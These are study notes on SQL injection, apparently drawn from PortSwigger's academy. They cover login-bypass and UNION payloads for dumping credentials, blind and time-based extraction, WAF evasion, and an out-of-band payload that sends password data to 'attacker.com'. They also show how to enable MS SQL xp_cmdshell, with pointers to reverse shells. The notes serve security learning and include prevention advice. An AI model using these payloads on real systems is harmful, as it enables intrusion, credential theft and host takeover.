`## SQL Injection
https://portswigger.net/web-security/sql-injection/cheat-sheet

- **What:** Attacker injects SQL code into the application’s database queries. This can read, modify, or delete data that the app can access, bypassing normal constraints.
    
- **Impact:** Steal user data (password hashes, PII, credit cards), modify or drop tables, or even execute commands if the DB supports it. Many major breaches have involved SQLi.
    
- **Common payloads:**
    
    - **Login bypass:** `admin' OR '1'='1' --` in a login field to force the condition true.
        
    - **Data retrieval:** `' UNION SELECT username, password FROM users --`.
        
    - **Boolean testing:** append `
	` vs `' OR 1=2; --` to observe differences.
        
    - **Error-based:** Inject invalid SQL to elicit errors (like `'` causing syntax error).
        
    - **Blind (time-based):** `' OR IF(1=1,SLEEP(5),0) --` to see a delayed response.
        
- **Detection:** Try a single quote (`'`) or known payloads (`OR 1=1 --`) on all inputs. Observe SQL errors or changes in output. PortSwigger suggests testing `'`, `OR 1=1`, `OR 1=2`, and payloads that cause delays.
- **Prevention:** Use parameterized queries (prepared statements) or ORM query builders. Never directly concatenate user input into SQL strings.

# Detailed documentation
## Detection
- **Manual testing**:
    - Insert single quote `'`; look for errors.
    - Test boolean logic: `OR 1=1` vs `OR 1=2`.
    - Time-based payloads: delays to notice slow responses.
    - OAST payloads: trigger out‑of‑band interactions.
- **Automation**: Use Burp Scanner for rapid scanning.

## Attack types
### 1. Retrieving hidden data
- Inject comment to remove conditions:
    - `…?category=Gifts'--` drops `AND released = 1`, revealing unreleased items. 

### 2. UNION-based data exfiltration
- Use `UNION SELECT` to merge attacker-selected rows.    
- Steps:
    1. Determine column count using `ORDER BY` or `UNION SELECT NULL...`.
    2. Find which columns accept strings.
    3. Inject:
        `' UNION SELECT username,password FROM users--` 

### 3. Blind SQL Injection
- When no direct data output:
    - **Boolean-based**: compare conditions to infer data:
        `' AND SUBSTRING((SELECT password FROM Users WHERE username='Administrator'),1,1)>'m`
        Repeat until resolved. 
    - **Error-based**: use errors to leak data:
        `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)`    
    - **Time-based**:
        `'…' OR pg_sleep(10)--` 
        Observe 10s delay. 
    - **Out-of-band (OAST)**: trigger DNS/HTTP to exfiltrate.

### Database Recon
- Query version:
    - SQL Server/MySQL: `SELECT @@version`
    - PostgreSQL: `SELECT version()`
    - Oracle: `SELECT * FROM v$version`
- Inspect schema:
    - `information_schema.tables` → list tables.
    - `information_schema.columns WHERE table_name='X'` → columns.

## **SQL Injection UNION Attacks**

- **Definition:**  
    A SQL injection UNION attack exploits vulnerable applications that return SQL query results in their responses by using the `UNION` keyword to combine results from additional queries and extract data from other database tables.
- **How UNION Works:**  
    `UNION` allows appending results from one or more `SELECT` queries to the original query's result set, e.g.,
    `SELECT a, b FROM table1 UNION SELECT c, d FROM table2`
- **Requirements for UNION Injection:**
    1. Both queries must return the same _number_ of columns.
    2. Corresponding columns must have _compatible data types_.
- **Step 1: Determine Number of Columns Returned by Original Query**  
    Two techniques:
    - Use incremental `ORDER BY` clauses to find when the column index causes an error.
    - Use `UNION SELECT` payloads with varying numbers of `NULL`s until no error occurs (`NULL` is compatible with many data types)
- **Step 2: Identify Columns That Can Hold String Data**  
    Test each column by injecting a string like `'a'` into it via `UNION SELECT 'a', NULL, ...--` payloads.  
    A data type mismatch (e.g., trying to put a string into an integer column) triggers an error.
- **Step 3: Extract Data**  
    Once number of columns and string columns are known, inject statements like:
    `' UNION SELECT username, password FROM users--`
    to retrieve sensitive data.
- **Concatenating Multiple Values in One Column:**  
    When only one column is returned, use string concatenation to combine fields, e.g. on Oracle:
    `' UNION SELECT username || '~' || password FROM users--`
- **Database-Specific Details:**
    - Oracle requires a `FROM DUAL` clause for `SELECT` with no table.
    - MySQL comments need a space after `--`.

## **Blind SQL Injection**

- **Definition:**  
    Blind SQL injection occurs when the application is vulnerable, but its responses do not disclose query results or detailed error messages, restricting ability to see immediate output from injected queries.
- **Why UNION Attacks Fail Here:**  
    `UNION` attacks rely on visible results in responses, which blind SQL injection does not expose.
- **Technique: Using Conditional Responses**  
    Exploit differences in application behavior by injecting boolean conditions that alter the response in some detectable way.  
    Example with tracking cookie:
    `TrackingId=xyz' AND '1'='1  # condition true: app responds "Welcome back" TrackingId=xyz' AND '1'='2  # condition false: no welcome message`
- **Character-by-Character Extraction:**  
    Use conditions on values to infer data one character at a time using SQL functions like `SUBSTRING` or `SUBSTR`.  
    Example to extract password's first character:
    `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Admin'), 1, 1) > 'm`
    Adjust character guesses until condition matches.
- **Error-Based Blind SQL Injection:**  
    Some blind SQL exploits leverage causing database errors conditionally, e.g., divide-by-zero, to distinguish true/false conditions by different application responses.  
    Example:
    `xyz' AND (SELECT CASE WHEN (condition) THEN 1/0 ELSE 'a' END)='a`
- **Verbose Error Messages:**  
    Occasionally, misconfigurations expose detailed SQL errors revealing query structure and aiding injection construction.
**Formal Notes: PortSwigger SQL Injection Module**  
*Prepared for Namura on Tuesday, December 23, 2025*  

---

### **1. Error-Based SQL Injection**  
- **Mechanism**: Exploits database error messages to extract data. Invalid queries force the database to return verbose errors containing sensitive information (e.g., table names, query structure).  
- **Key Techniques**:  
  - Inject malformed syntax (e.g., `'`, `"`, parentheses) to trigger errors.  
  - Leverage database-specific functions (e.g., `EXTRACTVALUE()` in MySQL, `CAST()` in PostgreSQL) to force errors containing target data.  
- **Critical Insight**: Requires verbose error reporting enabled on the target database. Mitigation involves suppressing detailed errors in production environments.  

---

### **2. Blind SQL Injection**  
- **Definition**: Occurs when the application does not return database errors or query results directly. Responses are boolean (true/false) or time-based.  
- **Subtypes**:  
  - **Conditional Responses**: Application behavior changes based on injected boolean conditions (e.g., `1=1` vs. `1=2`).  
  - **Time Delays**: Inject `SLEEP()` (MySQL), `PG_SLEEP()` (PostgreSQL), or `WAITFOR DELAY` (MSSQL) to infer truth via response latency.  
  - **Out-of-Band (OAST)**: Exfiltrate data via external channels (e.g., DNS/HTTP requests) using functions like `LOAD_FILE()` (MySQL) or `UTL_HTTP` (Oracle).  

---

### **3. Exploiting Blind SQLi: Conditional Responses**  
- **Methodology**:  
  1. Identify injectable parameters by testing boolean conditions (e.g., `' AND 1=1--` vs. `' AND 1=2--`).  
  2. Extract data character-by-character using substring functions (e.g., `SUBSTRING((SELECT password FROM users), 1, 1) = 'a'`).  
- **Automation**: Tools like Burp Intruder or SQLmap automate iterative testing for efficiency.  

---

### **4. Exploiting Blind SQLi: Time Delays**  
- **Use Case**: Effective when conditional responses are indistinguishable.  
- **Syntax Examples**:  
  - MySQL: `' UNION SELECT IF(1=1, SLEEP(5), 'a')--`  
  - MSSQL: `'; IF (1=1) WAITFOR DELAY '0:0:5'--`  
- **Limitation**: Network latency may obscure timing differences; requires multiple tests for reliability.  

---

### **5. Exploiting Blind SQLi: Out-of-Band (OAST)**  
- **Workflow**:  
  1. Trigger DNS/HTTP requests to an attacker-controlled server via database functions.  
  2. Exfiltrate data by embedding it in the request (e.g., `LOAD_FILE('\\\\attacker.com\\' || (SELECT password FROM users))`).  
- **Advantage**: Bypasses network restrictions and avoids noisy time-based payloads.  
- **Tools**: Burp Collaborator or Interact.sh for monitoring external interactions.  

---

### **6. SQL Injection in Different Contexts**  
- **Challenges**: Injection points vary by context (e.g., `WHERE` clauses, `ORDER BY`, stored procedures).  
- **Adaptation Strategies**:  
  - **String Contexts**: Escape quotes with `'` or `"`.  
  - **Numeric Contexts**: Omit quotes; use arithmetic (e.g., `1+1`).  
  - **Boolean Logic**: Bypass filters using `OR 1=1--` instead of `' OR '1'='1`.  
  - **Alternative Syntax**: Bypass WAFs with inline comments (`SEL/**/ECT`), URL encoding, or multi-byte characters.  

---

### **7. Second-Order SQL Injection**  
- **Mechanism**: Malicious input is stored benignly (e.g., in a user profile), then executed later when retrieved and concatenated into a dynamic query.  
- **Example**:  
  1. Attacker sets username to `' UNION SELECT password FROM users--`.  
  2. Application saves input *without immediate exploitation*.  
  3. Later, a password reset feature dynamically queries `username` without sanitization, triggering injection.  
- **Defense**: Treat *all* data sources (including databases) as untrusted; use parameterized queries consistently.  

---

### **8. Prevention of SQL Injection**  
- **Primary Mitigation**: **Parameterized Queries (Prepared Statements)**.  
  - Separates data from commands using placeholders (e.g., `?` in Java, `@param` in .NET).  
- **Secondary Defenses**:  
  - **Input Validation**: Whitelist allowed characters (e.g., regex for emails).  
  - **Least Privilege**: Restrict database user permissions.  
  - **Error Handling**: Generic error messages; avoid leaking stack traces.  
  - **Web Application Firewall (WAF)**: Deploy as a *supplemental* layer (not primary defense).  
- **Critical Principle**: **Never** concatenate untrusted input into SQL queries. ORM frameworks (e.g., Hibernate, Entity Framework) *do not* inherently prevent injection if raw queries are used.  

---  
*End of Notes*  
*Source: PortSwigger Web Security Academy SQL Injection Module*

These notes cover the **core methods, techniques, and considerations** for both types of SQL injection attacks, useful for understanding vulnerabilities, exploitation strategies, and database-specific nuances.

# SQLi / MS SQL Server RCE / Database Exploitation

---
## **Key Concept:**

- `xp_cmdshell` is a **built-in extended stored procedure** in MS SQL Server.
- It allows you to **execute arbitrary OS commands** directly from SQL queries.
- If enabled, it’s a **direct way to get a shell-like access** on the underlying Windows host.
    

---

## **Usage / Syntax**

```sql
-- Execute a single command
xp_cmdshell 'whoami';

-- Execute multiple commands (use GO to terminate batch)
xp_cmdshell 'dir C:\';
GO
```

- `GO` = batch separator for SQL Server Management Studio (SSMS) or `sqlcmd`.
- Typical commands:
    - `whoami`, `ipconfig`, `net user` → info gathering
    - `powershell -c "..."` → download & execute payloads
    - `cmd.exe /c ...` → run batch commands

---

## **Pre-requisites**

- SQL user must have **sysadmin privileges**, otherwise `xp_cmdshell` may be disabled.
- If disabled, you can try:

```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
GO
```

---

## **Post-Exploitation / Shell**

- Once xp_cmdshell works, you essentially have a **limited Windows shell**.
- You can then pivot to:
    - Upload/download files
    - Run scripts
    - Spawn a reverse shell with `powershell` or `nc.exe`

---